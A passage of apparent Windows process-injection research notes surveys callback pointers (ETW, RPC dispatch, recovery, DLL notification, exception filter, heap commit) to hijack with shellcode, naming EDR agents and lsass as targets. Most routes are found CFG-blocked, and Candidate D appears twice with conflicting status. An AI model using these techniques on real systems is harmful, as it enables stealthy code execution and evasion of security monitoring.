TraceLogfile.ProcessTraceMode = PROCESS_TRACE_MODE_EVENT_RECORD | PROCESS_TRACE_MODE_REAL_TIME;

TRACEHANDLE hTrace = OpenTrace(&TraceLogfile);
ProcessTrace(&hTrace, 1, NULL, NULL);  // Begins processing, callbacks fire
```

The callback signature:
```c
VOID WINAPI EventRecordCallback(
    PEVENT_RECORD EventRecord  // Contains event data
);
```

#### Attack Theory

```
1. Identify target processes consuming ETW events
   - Many system services consume ETW
   - Monitoring/diagnostics applications
   - Logging infrastructure

2. Locate EVENT_TRACE_LOGFILE structures or internal ETW consumer structures
   - Callback pointer stored in consumer session data
   - Need to reverse ETW consumer infrastructure

3. Overwrite EventRecordCallback pointer with shellcode address
   - May or may not need encoding (research needed)

4. Trigger: Generate ETW event that consumer is subscribed to
   - Natural triggers: system activity generates constant ETW events
   - Manual triggers: Use ETW provider APIs to generate events
```

#### Natural Triggers (Automatic)

ETW providers fire constantly on active systems:
- **Process/Thread events** - Process creation, thread creation/exit
- **File I/O events** - File operations trigger file I/O provider
- **Registry events** - Registry modifications
- **Network events** - Network activity
- **Performance counters** - Regular sampling events
- **Security events** - Audit events, logon/logoff

Consumers subscribed to common providers will receive callbacks automatically.

#### Manual Triggers (Controllable)

Can generate specific ETW events:
```c
// Register custom provider and generate events
EventWriteString(RegHandle, Level, Keyword, L"Event data");
```

#### Target Process Identification

Processes likely consuming ETW:
- **Windows services** - Many services consume ETW for diagnostics
- **Sysmon** - Consumes kernel ETW events
- **Performance monitoring tools** - PerfMon, Process Monitor
- **Security monitoring** - EDR agents, log collectors
- **Custom applications** - Apps using ETW for logging

Can identify via:
- Check for `OpenTrace` / `ProcessTrace` in loaded modules
- Look for ETW consumer handles in process

#### Research Questions

- [ ] Where exactly are `EventRecordCallback` pointers stored at runtime?
- [X] **Is callback invocation in `ProcessTrace` CFG protected?** → YES - BLOCKED
- [ ] What is the internal structure for ETW consumer sessions?
- [ ] How to reliably locate consumer structures in target process?
- [ ] Can we identify which ETW providers a process is subscribed to?

#### Key Functions to Reverse

| Function | Purpose |
|----------|---------|
| `OpenTrace` / `OpenTraceW` | Opens trace session, registers callback |
| `ProcessTrace` | **Main callback dispatcher** - check for CFG here |
| `CloseTrace` | Cleanup |
| Internal: `EtwpProcessTraceEvent` or similar | Actual callback invocation site |

#### WinDbg Investigation Commands

```
# Find ETW consumer functions
x ntdll!*Etw*
x sechost!*Trace*
x advapi32!*Trace*

# Check for callback invocation
uf advapi32!ProcessTrace
uf sechost!ProcessTrace

# Look for guard_dispatch_icall
uf /c advapi32!ProcessTrace | findstr guard_dispatch_icall
```

#### Complexity Assessment

- **Implementation**: Medium-High - Need to understand ETW consumer structures
- **Trigger**: Low - ETW events fire constantly, or can generate manually
- **Detection**: Very Low - ETW consumer manipulation never monitored
- **Target Applicability**: Medium-High - Many processes consume ETW

#### Advantages (If Not CFG Protected)

- **Extremely obscure** - Likely never researched for injection
- **Natural triggers** - System generates ETW events constantly
- **Broad applicability** - Many process types consume ETW
- **Older infrastructure** - Vista+ era, but still retrofitted with CFG
- **Legitimate mechanism** - ETW event processing is normal behavior

#### Conclusion

ETW consumer callback injection is **blocked by CFG**, despite being an older mechanism (Vista+). Microsoft has retrofitted CFG protection to the ETW callback dispatch code in `sechost!EtwpDoEventTraceCallbacks`. Same blocker as WNF, FLS, and Exception Filter.

**NOT VIABLE** without CFG bypass via `SetProcessValidCallTargets`.

---

### Candidate H: RPC Server Dispatch Table Hijacking

#### Concept

Many Windows processes act as RPC (Remote Procedure Call) servers, exposing interfaces that map RPC procedure numbers to handler functions via dispatch tables. These dispatch tables are **arrays of function pointers** similar to the Ctrl-C handler array in Variant 1.

#### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

#### Key Findings from Reversing

##### RPC Dispatch Call Chain

The RPC dispatch mechanism uses a multi-layered approach:

1. `NdrServerCall2` → wraps `NdrStubCall2`
2. `NdrStubCall2` → loads function pointer from dispatch table at `[rax+r12*8]`, calls `Invoke`
3. `Invoke` → calls `RpcInvokeCheckICall` for validation, then `call r10` (direct)
4. `RpcInvokeCheckICall` → **calls `_guard_check_icall_fptr`** (CFG validator!)

##### Critical Blocker: CFG Protection via _guard_check_icall_fptr

From `rpcrt4!RpcInvokeCheckICall`:

```asm
RPCRT4!RpcInvokeCheckICall:
    sub     rsp,28h
    call    qword ptr [RPCRT4!_guard_check_icall_fptr]  ; CFG VALIDATION!
    add     rsp,28h
    ret
```

**`_guard_check_icall_fptr`** is a function pointer to the CFG validator. This is the same validation mechanism that `guard_dispatch_icall` uses internally, just called explicitly rather than via a thunk.

The RPC dispatch flow:
- Dispatch table function pointer loaded from array
- Passed to validation wrapper (`RpcInvokeCheckICall`)
- CFG check performed via `_guard_check_icall_fptr`
- If validation passes, function pointer called directly

This means overwriting RPC dispatch table entries with shellcode addresses will fail CFG validation, same as all other callback mechanisms.

##### WinDbg Commands Used

```
# Trace dispatch chain
uf rpcrt4!NdrServerCall2        # Wrapper
uf rpcrt4!NdrStubCall2          # Dispatch table loader
uf rpcrt4!Invoke                # Invocation wrapper
uf rpcrt4!RpcInvokeCheckICall   # CFG validation wrapper

# Key finding at RpcInvokeCheckICall:
# call qword ptr [RPCRT4!_guard_check_icall_fptr]
```

#### Why This Is Novel (But Still Blocked)

- RPC dispatch table manipulation for injection appears undocumented
- Many processes expose RPC interfaces (services, COM servers, DCOM)
- Function pointer arrays pattern-match our successful Variant 1
- RPC infrastructure is older, might lack CFG protection

#### Background: How RPC Server Dispatch Works

```c
// RPC servers register interfaces with dispatch tables:
typedef struct {
    unsigned int DispatchTableCount;
    RPC_DISPATCH_FUNCTION* DispatchTable;  // ← Array of function pointers!
} RPC_DISPATCH_TABLE;

typedef RPC_STATUS (*RPC_DISPATCH_FUNCTION)(
    PRPC_MESSAGE Message
);

RPC_SERVER_INTERFACE ServerInterface;
ServerInterface.DispatchTable = &MyDispatchTable;

RpcServerRegisterIf2(&ServerInterface, ...);
```

When an RPC call arrives:
1. RPC runtime receives call with procedure number
2. Looks up procedure number in dispatch table
3. Calls corresponding function pointer with RPC_MESSAGE parameter
4. Function executes and returns result

#### Attack Theory

```
1. Identify target processes acting as RPC servers
   - svchost.exe instances
   - COM/DCOM servers
   - System services
   - Many Windows components

2. Enumerate registered RPC interfaces in target
   - Find RPC_SERVER_INTERFACE structures
   - Locate dispatch tables (RPC_DISPATCH_TABLE)

3. Overwrite dispatch table entry with shellcode address
   - Replace function pointer at specific procedure number
   - May need to handle pointer encoding (research needed)

4. Trigger: Make RPC call to hijacked procedure number
   - Call via RPC from our process
   - Wait for natural RPC call from system/other processes
```

#### Target Process Identification

Processes exposing RPC interfaces:
- **svchost.exe** - Hosts many RPC-based services
- **lsass.exe** - Exposes security-related RPC interfaces
- **services.exe** - Service Control Manager RPC
- **dllhost.exe** - COM surrogate with RPC interfaces
- **spoolsv.exe** - Print Spooler RPC (infamous)
- **taskhost.exe** - Task Scheduler RPC
- **Custom services** - Many third-party services expose RPC

Can enumerate via:
- Parse process memory for RPC interface structures
- Use RPC debugging/enumeration tools
- Check registered endpoints with system RPC mapper

#### Trigger Options

**Manual Triggers:**
```c
// Make RPC call to hijacked procedure
RPC_BINDING_HANDLE hBinding;
RpcStringBindingCompose(
    NULL,                    // UUID
    L"ncacn_np",            // Protocol: named pipe
    L"\\\\.",               // Local machine
    L"\\pipe\\PipeName",    // Endpoint
    NULL,
    &StringBinding
);
RpcBindingFromStringBinding(StringBinding, &hBinding);

// Call procedure number we hijacked
MyRpcCall(hBinding, ...);  // Triggers shellcode!
```

**Natural Triggers:**
- Many RPC interfaces called automatically by system
- Other processes making legitimate RPC calls
- Scheduled tasks triggering RPC calls
- System maintenance operations

#### Research Questions

- [ ] Where are RPC_SERVER_INTERFACE structures stored in memory?
- [ ] Where are dispatch tables located (rpcrt4.dll? per-server allocation)?
- [X] **Is RPC dispatch function invocation CFG protected?** → YES - BLOCKED via `_guard_check_icall_fptr`
- [ ] How to enumerate registered interfaces in a target process?
- [ ] Are dispatch table pointers encoded?

#### Key Functions to Reverse

| Function | Purpose |
|----------|---------|
| `RpcServerRegisterIf2` / `RpcServerRegisterIfEx` | Registers interface, stores dispatch table |
| `RpcServerListen` | Begins listening for calls |
| Internal: `Invoke_*` or `RPC_INTERFACE::Invoke` | **Dispatch table lookup and call** - check CFG here |
| `NdrServerCall2` | NDR (Network Data Representation) dispatch |
| `NdrStubCall2` | Alternative dispatch mechanism |

#### WinDbg Investigation Commands

```
# Find RPC structures and functions
x rpcrt4!*Dispatch*
x rpcrt4!*Interface*
x rpcrt4!*ServerRegister*

# Check dispatch call site
uf rpcrt4!NdrServerCall2
uf rpcrt4!Invoke_*

# Look for CFG protection
uf /c rpcrt4!NdrServerCall2 | findstr guard_dispatch_icall

# Examine RPC interface structure
dt rpcrt4!RPC_SERVER_INTERFACE
dt rpcrt4!RPC_DISPATCH_TABLE
```

#### Complexity Assessment

- **Implementation**: High - Complex RPC internals, need to parse structures
- **Trigger**: Low-Medium - RPC calls can be made manually or occur naturally
- **Detection**: Medium - RPC calls are normal but cross-process memory write monitored
- **Target Applicability**: Very High - Most Windows services expose RPC

#### Advantages (If Not CFG Protected)

- **Pattern-matches Variant 1** - Function pointer array manipulation
- **Broad applicability** - RPC servers everywhere in Windows
- **Controllable trigger** - Can make specific RPC calls
- **Legitimate mechanism** - RPC calls are normal system behavior
- **Older infrastructure** - RPC predates CFG (but still retrofitted)

#### Conclusion

RPC dispatch table injection is **blocked by CFG**. Despite using a different implementation pattern than other mechanisms (explicit `_guard_check_icall_fptr` call rather than `guard_dispatch_icall` thunk), the result is the same - CFG validation prevents shellcode execution.

This is the **6th consecutive callback mechanism** found to be CFG protected, establishing a clear pattern: Microsoft has systematically retrofitted CFG to virtually all callback-based code execution paths in Windows.

Despite pattern-matching our successful Variant 1 (function pointer array manipulation), RPC's older codebase has still been hardened with CFG protection.

**NOT VIABLE** without CFG bypass via `SetProcessValidCallTargets`.

---

### Candidate I: Application Recovery Callback Hijacking

#### Concept

Windows Restart Manager allows applications to register recovery callbacks that execute when the application is about to crash or during system shutdown/restart. These callbacks are designed to save state before termination.

#### Status: Research In Progress

#### Why This Is Novel

- Recovery callbacks exist but manipulation for injection appears undocumented
- Many modern applications register recovery callbacks
- Natural triggers via system events (shutdown, restart, logoff)
- Mechanism focused on recovery, possibly not hardened against abuse

#### Background: Application Recovery API

```c
// Applications register recovery callbacks:
typedef DWORD (WINAPI *APPLICATION_RECOVERY_CALLBACK)(
    PVOID pvParameter
);

HRESULT RegisterApplicationRecoveryCallback(
    APPLICATION_RECOVERY_CALLBACK pRecoveryCallback,  // ← Function pointer!
    PVOID pvParameter,
    DWORD dwPingInterval,    // How often to ping (milliseconds)
    DWORD dwFlags
);

// In callback, application can:
// - Save state
// - Clean up resources
// - ApplicationRecoveryInProgress() to prevent termination timeout
// - ApplicationRecoveryFinished() to signal completion
```

When callback fires:
1. System detects application needs recovery (crash, shutdown, hang)
2. Windows Restart Manager invokes registered callback
3. Callback executes with parameter
4. Application can save state before termination

#### Attack Theory

```
1. Identify target applications with registered recovery callbacks
   - Modern applications (Office, browsers, development tools)
   - Applications using Restart Manager

2. Locate recovery callback storage in target process
   - Likely in kernel32.dll or private process structures
   - Need to reverse RegisterApplicationRecoveryCallback implementation

3. Overwrite callback pointer with shellcode address
   - May need pointer encoding (research needed)

4. Trigger: Force application into recovery scenario
   - System shutdown/restart
   - Application hang detection
   - Restart Manager shutdown request
   - Session logoff
```

#### Natural Triggers (Automatic)

Recovery callbacks fire during:
- **System shutdown** - User initiates shutdown
- **System restart** - Windows Update restart, manual restart
- **User logoff** - Session termination
- **Application hang** - Windows detects unresponsive application
- **Windows Update** - Update installation triggers restart

These are all normal user/system operations that occur naturally.

#### Manual Triggers (Controllable)

```c
// Use Restart Manager API to request recovery:
DWORD dwSession;
WCHAR szSessionKey[CCH_RM_SESSION_KEY+1];

// Start Restart Manager session
RmStartSession(&dwSession, 0, szSessionKey);

// Register target process
RM_UNIQUE_PROCESS rgProcesses[1];
rgProcesses[0].dwProcessId = targetPID;
GetProcessTimes(hProcess, &rgProcesses[0].ProcessStartTime, ...);
RmRegisterResources(dwSession, 0, NULL, 1, rgProcesses, 0, NULL);

// Request shutdown - triggers recovery callback!
RmShutdown(dwSession, RmForceShutdown, NULL);

// End session
RmEndSession(dwSession);
```

#### Target Applications

Applications likely to have registered recovery callbacks:
- **Microsoft Office** - Word, Excel, PowerPoint (document recovery)
- **Web browsers** - Chrome, Edge, Firefox (session restore)
- **Development tools** - Visual Studio, VS Code (workspace recovery)
- **Creative applications** - Adobe products, image editors
- **Database applications** - SQL clients, management tools
- **Modern Windows apps** - Apps using Restart Manager

Can identify via:
- Applications with auto-recovery features
- Check for `RegisterApplicationRecoveryCallback` imports
- Test applications that survive crashes with state restoration

#### Research Questions

- [ ] Where is the recovery callback pointer stored in process memory?
- [ ] Is callback invocation CFG protected?
- [ ] What is the internal structure for recovery context?
- [ ] How to reliably locate recovery callback registration?
- [ ] Can we identify if a process has registered a recovery callback?

#### Key Functions to Reverse

| Function | Purpose |
|----------|---------|
| `RegisterApplicationRecoveryCallback` | Registers callback, stores pointer |
| `UnregisterApplicationRecoveryCallback` | Unregisters callback |
| `ApplicationRecoveryInProgress` | Called during recovery to extend timeout |
| `ApplicationRecoveryFinished` | Signals recovery complete |
| Internal: Recovery dispatcher | **Actual callback invocation** - check CFG here |
| `RmStartSession` / `RmShutdown` | Restart Manager triggering mechanisms |

#### WinDbg Investigation Commands

```
# Find recovery-related functions
x kernel32!*Recovery*
x kernel32!*Restart*
x rstrtmgr!*

# Check for global storage
x kernel32!*Recovery*Context*
x kernel32!*Recovery*Callback*

# Examine callback invocation
uf kernel32!RegisterApplicationRecoveryCallback

# Look for CFG protection at invocation site
# (Need to find where callback is actually called)
```

#### Complexity Assessment

- **Implementation**: Medium - Need to locate callback storage mechanism
- **Trigger**: Medium - Natural triggers require waiting, manual trigger via Restart Manager
- **Detection**: Low - Recovery callbacks and Restart Manager are legitimate
- **Target Applicability**: Medium - Modern applications, not all processes

#### Advantages

- **Natural triggers** - System events fire automatically
- **Legitimate mechanism** - Recovery and Restart Manager are normal Windows features
- **Likely obscure** - Recovery callback hijacking probably never researched
- **Interesting targets** - High-value applications (Office, browsers, dev tools)

---

### Candidate J: Memory Resource Notification Callbacks

#### Concept

Windows allows processes to register for notifications when system memory conditions change (low memory, high memory). These use a combination of `CreateMemoryResourceNotification` and `RegisterWaitForSingleObject`, creating a callback mechanism triggered by natural system events.

#### Status: Research Queued

#### Why This Is Novel

- Extremely obscure API combination
- Natural trigger (system memory pressure)
- Wait callback mechanism might not be CFG protected
- Appears completely undocumented for injection

#### Background

```c
// Create memory resource notification handle:
HANDLE hMemNotify = CreateMemoryResourceNotification(
    LowMemoryResourceNotification  // or HighMemoryResourceNotification
);

// Register wait callback:
HANDLE hWait;
RegisterWaitForSingleObject(
    &hWait,
    hMemNotify,               // Wait on memory notification
    WaitCallback,             // ← Function pointer!
    pContext,
    INFINITE,                 // Wait indefinitely
    WT_EXECUTEDEFAULT         // Flags
);

// Callback signature:
VOID CALLBACK WaitCallback(
    PVOID lpParameter,
    BOOLEAN TimerOrWaitFired
);
```

When system memory conditions change, the notification handle becomes signaled, and the callback fires.

#### Natural Triggers

- System enters low memory condition (high memory usage)
- System recovers to high memory availability
- Natural system operation

#### Manual Triggers

- Allocate large amounts of memory to force low memory condition
- Release memory to trigger high memory notification

#### Research Status

Queued for future investigation. Need to determine if wait callbacks are CFG protected (likely yes, as they're thread pool related).

---

### Candidate D: LdrpDllNotificationList Injection

#### Concept (Moved from previous section for clarity)

When DLLs load/unload, ntdll walks a notification list and calls registered callbacks. The list is:

```
ntdll!LdrpDllNotificationList - Linked list of notification entries
```

Each entry contains a callback function pointer that's called on DLL events.

#### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

#### Key Findings from Reversing

##### Critical Blocker: CFG Protection

From `ntdll!LdrpSendDllNotifications`, the function responsible for dispatching DLL notification callbacks:

```asm
ntdll!LdrpSendDllNotifications+0x84:
    mov     rax,qword ptr [rbx+10h]           ; Load callback pointer from entry
    mov     ecx,edi                            ; Notification reason
    call    ntdll!guard_dispatch_icall$thunk$10345483385596137414  ; CFG PROTECTED!
```

**The DLL notification callback invocation site uses `guard_dispatch_icall`**, which validates the callback target address against the CFG bitmap before allowing the call. This means:

- Overwriting callback pointers with shellcode addresses will fail CFG validation
- Process will crash or callback invocation will be blocked
- Same blocker as WNF, FLS, Exception Filter, and ETW mechanisms

##### Notification Entry Structure

From the disassembly, each list entry appears to have:
- `+0x00`: Flink (next entry pointer)
- `+0x10`: Callback function pointer (invoked via CFG)
- `+0x18`: Context parameter (passed to callback as r8)

The list is protected by `ntdll!LdrpDllNotificationLock` critical section.

##### WinDbg Commands Used

```
# Find the notification list
x ntdll!*DllNotification*
dq ntdll!LdrpDllNotificationList L1

# Check callback dispatch function
uf ntdll!LdrpSendDllNotifications

# Confirmed: guard_dispatch_icall invocation at offset +0x8a
```

#### Attack Theory (Blocked by CFG)

```
1. Find LdrpDllNotificationList head in target's ntdll
2. Allocate fake notification entry with our shellcode as callback
3. Insert entry into the list (manipulate Flink/Blink pointers)
4. Trigger DLL load in target:
   - LoadLibrary call
   - Delay-load DLL resolution
   - COM object instantiation
5. Notification callback fires → shellcode executes
```

#### Why This Might Be Interesting

- **List injection**: We successfully manipulated the Ctrl-C handler list
- **Many triggers**: DLL loads happen frequently
- **Legitimate mechanism**: Process loading DLLs is normal behavior

#### Research Questions

- [X] **Is the callback invocation CFG protected?** → YES - BLOCKED
- [X] **What's the notification entry structure?** → Linked list with callback at +0x10, context at +0x18
- [X] **Are there lock/synchronization requirements?** → Yes - LdrpDllNotificationLock critical section
- [ ] What's the callback signature?

#### Complexity Assessment (If Not CFG Protected)

- **Implementation**: Medium - linked list manipulation
- **Trigger**: Low - DLL loads are easy to trigger
- **Detection**: Medium - list manipulation might be monitored
- **Target Applicability**: Very High - All processes load DLLs

#### Conclusion

DLL notification callback injection is **blocked by CFG**. The callback dispatch in `ntdll!LdrpSendDllNotifications` uses `guard_dispatch_icall` for validation. This is the **5th consecutive callback mechanism** found to be CFG protected.

Despite pattern-matching our successful Variant 1 (list-based injection with function pointers), Microsoft has retrofitted CFG protection to the DLL notification system.

**NOT VIABLE** without CFG bypass via `SetProcessValidCallTargets`.

---

### Candidate A: TEB Transaction Scope Callbacks

#### Concept

The Thread Environment Block (TEB) contains function pointers for transactional operation callbacks:

```
TEB Structure (from WinDbg dt ntdll!_TEB):
   +0x17F0 TxnScopeEnterCallback : Ptr64 Void
   +0x17F8 TxnScopeExitCallback  : Ptr64 Void
   +0x1800 TxnScopeContext       : Ptr64 Void
```

### Status: Research Complete - **VESTIGIAL/UNUSED** (Not Viable)

#### Key Findings from Reversing

##### No Symbols for TxnScope Functions

```
0:029> x ntdll!*TxnScope*
[no results]
```

No exported functions manipulate these TEB fields directly. Only transaction handle functions exist:
- `RtlSetCurrentTransaction` - writes to TEB+0x17B8 (transaction HANDLE, not callbacks)
- `RtlGetCurrentTransaction` - reads from TEB+0x17B8

##### All Threads Have NULL Values

```
0:029> ~*e dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback @$teb
   +0x17f0 TxnScopeEnterCallback : (null)
   +0x17f8 TxnScopeExitCallback  : (null)
[repeated for all 30 threads - ALL NULL]
```

##### Thread Pool Only CHECKS These Fields (Never Calls)

Found references via byte pattern search `s -b ntdll L?500000 F0 17 00 00`:

| Address | Function | Purpose |
|---------|----------|---------|
| `TppCallbackCheckThreadBeforeCallback+0x6d` | Validation check |
| `TppWorkerThread+0x8c0` | Validation check |
| `TppWorkerThread+0x9d2` | Validation check |
| `TppCallbackCheckThreadAfterCallback+0x1ca` | Validation + raise exception |

The code only **compares** these fields against zero:
```asm
; TppWorkerThread checking TxnScope fields
cmp     qword ptr [rcx+17F0h],0   ; Is TxnScopeEnterCallback set?
jne     ...                        ; If yes, set validation flag
cmp     qword ptr [rcx+17F8h],0   ; Is TxnScopeExitCallback set?
jne     ...                        ; If yes, set validation flag
cmp     qword ptr [rcx+1800h],0   ; Is TxnScopeContext set?
jne     ...                        ; If yes, set validation flag
```

In `TppCallbackCheckThreadAfterCallback`, if these are unexpectedly set after a callback:
```asm
cmp     qword ptr [rcx+17F0h],rsi  ; rsi = 0
jne     +0x33f                      ; Jump to RtlRaiseException!
```

**The thread pool raises an exception if these are set** - they're used for state leak detection, not callback invocation.

##### CreateProcessInternalW - False Positive

Initial search hit in kernelbase was a **false positive**:
```asm
mov     qword ptr [rsp+17F0h],rax    ; STACK offset, not TEB!
mov     qword ptr [rsp+17F8h],1      ; Building struct on stack
```

The byte pattern 0x17F0 matched because it appears in stack-relative addressing, not TEB access.

##### Thread Pool Callbacks ARE CFG Protected

While investigating, confirmed that actual thread pool callback invocation uses CFG:
```asm
ntdll!TppWorkerThread+0x59b:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG PROTECTED

ntdll!TppWorkerThread+0x81b:
    call    ntdll!guard_dispatch_icall$thunk$...  ; CFG PROTECTED
```

#### Conclusion

TxnScope callback fields are **vestigial/reserved** in the TEB:

1. **Never invoked** - No user-mode code calls these callbacks
2. **Validation only** - Thread pool checks they're NULL as sanity check
3. **No setter functions** - No API exists to populate these fields
4. **Exception on unexpected state** - Having these set triggers exceptions

**NOT VIABLE** for injection - these fields exist in the structure but are not functional callback mechanisms.

#### WinDbg Commands Used

```
# Check TEB fields
dt ntdll!_TEB TxnScopeEnterCallback TxnScopeExitCallback TxnScopeContext @$teb

# Search for symbols
x ntdll!*TxnScope*
x ntdll!*Transaction*

# Binary search for code referencing offset 0x17F0
s -b ntdll L?500000 F0 17 00 00

# Identify containing functions
ln <address>

# Disassemble key functions
uf ntdll!TppWorkerThread
uf ntdll!TppCallbackCheckThreadBeforeCallback
uf ntdll!TppCallbackCheckThreadAfterCallback
```

---

### Candidate B: TEB ActiveFrame Chain Injection

#### Concept

The TEB contains a linked list of "active frames":

```
TEB Structure:
   +0x17C0 ActiveFrame : Ptr64 _TEB_ACTIVE_FRAME
```

The `_TEB_ACTIVE_FRAME` structure forms a stack of context frames:

```c
typedef struct _TEB_ACTIVE_FRAME {
    ULONG Flags;
    struct _TEB_ACTIVE_FRAME *Previous;
    PTEB_ACTIVE_FRAME_CONTEXT Context;
} TEB_ACTIVE_FRAME, *PTEB_ACTIVE_FRAME;

typedef struct _TEB_ACTIVE_FRAME_CONTEXT {
    ULONG Flags;
    PSTR FrameName;
} TEB_ACTIVE_FRAME_CONTEXT, *PTEB_ACTIVE_FRAME_CONTEXT;
```

#### Attack Theory

```
1. Understand what walks/processes the ActiveFrame chain
2. Allocate fake TEB_ACTIVE_FRAME structure in target
3. Inject it into the chain (modify TEB+0x17C0)
4. If processing involves callbacks or function pointers, hijack those
5. Trigger whatever processes the frame chain
```

#### Why This Might Be Interesting

- **Linked list manipulation**: Similar to other list-based injections
- **Per-thread**: Each thread has its own frame chain
- **Unknown processing**: Need to research what uses this

#### Research Questions

- [ ] What code walks the ActiveFrame chain?
- [ ] Are there any callbacks associated with frame processing?
- [ ] What are common FrameName values?
- [ ] When are frames pushed/popped?

#### WinDbg Investigation Commands

```
# Check current thread's active frame
dt ntdll!_TEB ActiveFrame @$teb
dt ntdll!_TEB_ACTIVE_FRAME poi(@$teb+0x17c0)

# Find functions that manipulate active frames
x ntdll!*ActiveFrame*
x ntdll!RtlPush*
x ntdll!RtlPop*
```

#### Complexity Assessment

- **Implementation**: High - need to understand frame semantics
- **Trigger**: Unknown
- **Detection**: Unknown

---

### Candidate C: RtlpUnhandledExceptionFilter Hijacking

#### Concept

ntdll contains a global unhandled exception filter pointer. When an exception goes unhandled through SEH/VEH, this filter gets called as a last resort.

```c
// Global in ntdll
PTOP_LEVEL_EXCEPTION_FILTER RtlpUnhandledExceptionFilter;

// Callback signature
LONG WINAPI UnhandledExceptionFilter(
    _In_ PEXCEPTION_POINTERS ExceptionInfo
);
```

### Status: Research Complete - **CFG PROTECTED** (Implementation Blocked)

#### Key Findings from Reversing

##### Global Filter Location and Encoding

```
ntdll!RtlpUnhandledExceptionFilter @ 00007ffa`0bd32948
Current encoded value: c74ec280`001ffeae
```

The filter pointer IS encoded using RtlEncodePointer, same as Ctrl-C handlers:

```asm
; From ntdll!RtlSetUnhandledExceptionFilter:
call    ntdll!RtlEncodePointer           ; Encode the filter pointer
mov     qword ptr [ntdll!RtlpUnhandledExceptionFilter],rax  ; Store encoded
```

##### Exception Dispatch Flow

```
KiUserExceptionDispatcher
    └──> RtlDispatchException
            └──> [SEH/VEH handling attempts]
                    └──> UnhandledExceptionFilter (kernelbase)
                            └──> Calls user's filter (CFG PROTECTED!)
```

##### Critical Blocker: CFG Protection

The user's exception filter is called from `kernelbase!UnhandledExceptionFilter`, NOT directly from ntdll. The call site IS CFG protected:

```asm
KERNELBASE!UnhandledExceptionFilter+0x13e:
    mov     rcx,qword ptr [KERNELBASE!BasepCurrentTopLevelFilter ...]
    call    qword ptr [KERNELBASE!_imp_RtlDecodePointer ...]
    mov     rsi,rax                           ; rsi = decoded filter pointer

; ... later at +0x1F8:
KERNELBASE!UnhandledExceptionFilter+0x1F8:
    mov     rcx,r15                           ; rcx = EXCEPTION_POINTERS
    mov     rax,rsi                           ; rax = decoded filter
    call    KERNELBASE!guard_dispatch_icall$thunk$10345483385596137414  ; CFG PROTECTED!
```

**The indirect call at offset 0x1FE uses `guard_dispatch_icall`**, which validates the target address against the CFG bitmap before allowing the call.

##### Two Filter Locations

There are actually TWO copies of the filter pointer:
1. `ntdll!RtlpUnhandledExceptionFilter` - ntdll's copy
2. `KERNELBASE!BasepCurrentTopLevelFilter` - kernelbase's copy (used for actual call)

Both are encoded, and the call through BasepCurrentTopLevelFilter is CFG protected.

#### Why This Technique Fails

Even if we:
1. Get the process cookie via NtQueryInformationProcess(ProcessCookie)
2. Encode our shellcode pointer correctly using RtlEncodePointer algorithm
3. Overwrite either RtlpUnhandledExceptionFilter or BasepCurrentTopLevelFilter

CFG will block the indirect call to our shellcode because:
- Shellcode address is not in an approved CFG region
- `guard_dispatch_icall` validates before calling
- Process will crash or filter call will fail

#### WinDbg Commands Used

```
# Find the global filter and its value
x ntdll!RtlpUnhandledExceptionFilter
dq ntdll!RtlpUnhandledExceptionFilter L1

# Find kernelbase's copy
x kernelbase!*TopLevel*
x kernelbase!*Filter*

# Examine the call site (this revealed CFG protection)
uf kernelbase!UnhandledExceptionFilter

# Key finding at offset 0x1FE:
# call    KERNELBASE!guard_dispatch_icall$thunk$...
```

#### Potential CFG Workaround

Same as WNF/FLS - would require `SetProcessValidCallTargets`:
```c
NtSetInformationVirtualMemory(
    hProcess,
    VmCfgCallTargetInformation,  // Info class 2
    ...
);
```

This adds detection surface and complexity.

#### Conclusion

RtlpUnhandledExceptionFilter hijacking is **blocked by CFG**, same as WNF and FLS. The exception filter callback mechanism, despite being older, has been retrofitted with CFG protection in the `kernelbase!UnhandledExceptionFilter` implementation.

**NOT VIABLE** without CFG bypass.

---

### Candidate D: LdrpDllNotificationList Injection

#### Concept

When DLLs load/unload, ntdll walks a notification list and calls registered callbacks. The list is:

```
ntdll!LdrpDllNotificationList - Linked list of notification entries
```

Each entry contains a callback function pointer that's called on DLL events.

#### Attack Theory

```
1. Find LdrpDllNotificationList head in target's ntdll
2. Allocate fake notification entry with our shellcode as callback
3. Insert entry into the list (manipulate Flink/Blink pointers)
4. Trigger DLL load in target:
   - LoadLibrary call
   - Delay-load DLL resolution
   - COM object instantiation
5. Notification callback fires → shellcode executes
```

#### Why This Might Be Interesting

- **List injection**: We successfully manipulated the Ctrl-C handler list
- **Many triggers**: DLL loads happen frequently
- **Legitimate mechanism**: Process loading DLLs is normal behavior

#### Research Questions

- [ ] Is the callback invocation CFG protected?
- [ ] What's the notification entry structure?
- [ ] Are there lock/synchronization requirements?
- [ ] What's the callback signature?

#### WinDbg Investigation Commands

```
# Find the notification list
x ntdll!*DllNotification*
x ntdll!Ldrp*Notification*

# Check list contents
dt ntdll!_LIST_ENTRY poi(ntdll!LdrpDllNotificationList)

# Find callback invocation
uf ntdll!LdrpCalloutDllNotification
```

#### Complexity Assessment

- **Implementation**: Medium - linked list manipulation
- **Trigger**: Low - DLL loads are easy to trigger
- **Detection**: Medium - list manipulation might be monitored

---

### Candidate E: Heap Commit Routine Callbacks

#### Concept

Windows heaps can have custom commit/decommit routines for memory management:

```c
typedef struct _RTL_HEAP_PARAMETERS {
    ULONG Length;
    SIZE_T SegmentReserve;
    SIZE_T SegmentCommit;
    SIZE_T DeCommitFreeBlockThreshold;
    SIZE_T DeCommitTotalFreeThreshold;
    SIZE_T MaximumAllocationSize;
    SIZE_T VirtualMemoryThreshold;
    BOOLEAN InitialCommit;
    BOOLEAN SegmentFlags;
    UCHAR Unknown[2];
    PRTL_HEAP_COMMIT_ROUTINE CommitRoutine;  // ← Function pointer!
} RTL_HEAP_PARAMETERS, *PRTL_HEAP_PARAMETERS;

typedef NTSTATUS (NTAPI *PRTL_HEAP_COMMIT_ROUTINE)(
    IN PVOID Base,
    IN OUT PVOID *CommitAddress,
    IN OUT PSIZE_T CommitSize
);
```

#### Attack Theory

```
1. Find target process's heap structure(s)
2. Locate CommitRoutine pointer in heap parameters
3. Overwrite with shellcode address
4. Trigger heap expansion (large allocation)
5. Commit routine called → shellcode executes
```

#### Why This Might Work

- **Deep in heap internals**: Less likely to be monitored
- **Legitimate callback**: Called during normal heap operations
- **Multiple heaps**: Process may have multiple heaps to target

#### Research Questions

- [ ] Where exactly is CommitRoutine stored at runtime?
